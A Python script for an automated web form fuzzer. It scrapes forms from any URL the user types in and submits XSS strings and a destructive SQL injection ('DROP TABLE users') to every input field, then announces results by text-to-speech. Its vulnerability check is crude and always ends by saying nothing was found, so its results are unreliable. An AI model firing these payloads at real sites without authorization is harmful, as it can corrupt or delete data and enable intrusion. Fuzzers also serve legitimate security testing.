import requests
from bs4 import BeautifulSoup
import urllib.parse
import pyttsx3

def automated_fuzzer():
    # Fuzzer payloads
    fuzzer_payloads = [
        "<script>alert('XSS');</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "\"\"><script>alert('XSS');</script><input type='text'",
        "test'; DROP TABLE users; --",
    ]

    def speak(text, print_message=True):
        if print_message:
            print(text)
            engine = pyttsx3.init()
            engine.setProperty('rate', 150)
            engine.say(text)
            engine.runAndWait()

    def fuzz_input_fields(url, form_data):
        s = requests.Session()
        s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"

        try:
            response = s.get(url)
            response.raise_for_status()
        except requests.RequestException as e:
            speak(f"Error fetching URL: {e}")
            return

        soup = BeautifulSoup(response.content, "html.parser")
        forms = soup.find_all("form")

        total_input_fields = 0

        for form in forms:
            form_details = {}
            action = urllib.parse.urljoin(url, form.get("action"))
            method = form.get("method", "get").lower()
            inputs = []

            for input_tag in form.find_all("input"):
                input_type = input_tag.get("type", "text")
                input_name = input_tag.get("name")
                inputs.append({
                    "type": input_type,
                    "name": input_name,
                })

            form_details['action'] = action
            form_details['method'] = method
            form_details['inputs'] = inputs

            fuzzed_data = {}

            for payload in fuzzer_payloads:
                for input_tag in form_details["inputs"]:
                    fuzzed_data[input_tag["name"]] = payload

                    print(f"Fuzzing input field: {input_tag['name']} with payload: {payload}")

                    if form_details["method"] == "post":
                        res = s.post(form_details["action"], data=fuzzed_data)
                    elif form_details["method"] == "get":
                        res = s.get(form_details["action"], params=fuzzed_data)

                    # Check for vulnerabilities
                    if res.status_code == 200 and "error" in res.text.lower():
                        speak("Vulnerability detected!")
                        speak(f"For the input field: {input_tag['name']}")
                        speak(f"With payload: {payload}")
                    else:
                        total_input_fields += 1

                    # Reset fuzzed_data for the next iteration
                    fuzzed_data = {}

        print(f"Using the following data to test: {', '.join(fuzzer_payloads)}")
        speak("No vulnerability detected.")

    # Ask the user for the URL
    speak("Sure. Launching the automated fuzzing program.")
    url_to_fuzz = input("Enter the URL to fuzz: ")
    speak("Fuzzing...")
    fuzz_input_fields(url_to_fuzz, form_data={})

# Call the function to execute the automated fuzzer
# automated_fuzzer()
